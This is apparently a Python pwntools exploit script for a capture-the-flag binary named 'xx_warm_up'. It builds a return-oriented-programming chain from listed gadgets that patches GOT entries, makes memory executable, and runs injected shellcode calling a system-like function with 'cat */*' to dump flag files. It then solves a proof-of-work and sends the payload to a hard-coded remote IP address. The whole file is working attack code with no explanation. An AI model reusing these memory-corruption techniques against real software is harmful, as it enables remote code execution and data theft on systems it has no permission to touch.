__author__  = 'b1gtang'

import os
import sys
from pwn import *
from time import sleep

context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

BINARY = './xx_warm-up'

code = ELF('./xx_warm_up')

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

'''
0x08048408 : adc byte ptr [edi + ebx*8 - 0x75], bh ; inc ebp ; or cl, cl ; ret
0x0804861a : pop edi ; pop ebp ; ret
0x080482ad : pop ebx ; ret
'''

addespc=0x80482aa
pebx=0x80482ad
adc=0x8048408
pediebp=0x804861a

sc = '''
sub esi, 0x1982f0
mov esp, 0x0804affc
push 0x804a0b8
call esi
'''

sc = asm(sc)
payload=((p32(pebx)+p32(0x8000)+p32(pediebp)+p32(0x804A00C+0x75-0x8000*8)+'flag'+p32(adc)+p32(pebx)+p32(0x9f00)+p32(pediebp)+p32(0x804a00d+0x75-0x9f00*8)+p32(0)+p32(adc)+p32(pediebp)+p32(0x804a00e+0x75-0xe00*8)+p32(0)+p32(0x8048518)).ljust(0x40,'a')+p32(0x804a044)+p32(pebx)+p32(0xe00)+p32(adc)+p32(0x80482C0)+p32(0x804a0a4)+p32(0x804a000)+p32(0x1000)+p32(7)+sc)
payload=payload.ljust(0x78, 'a')
payload+='cat */*  '

payload = payload.encode('hex')
print payload
print hex(len(payload))

p=remote("49.4.30.253",31337)

from hashlib import sha256
def pow():
    global p
    chal=p.recvline().strip('\n')
    while True:
        sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
        if sha256(chal + sol).hexdigest().startswith('00000'):
            p.send(sol)
            return
pow()

p.send(payload)
#gdb.attach(p)
p.interactive()
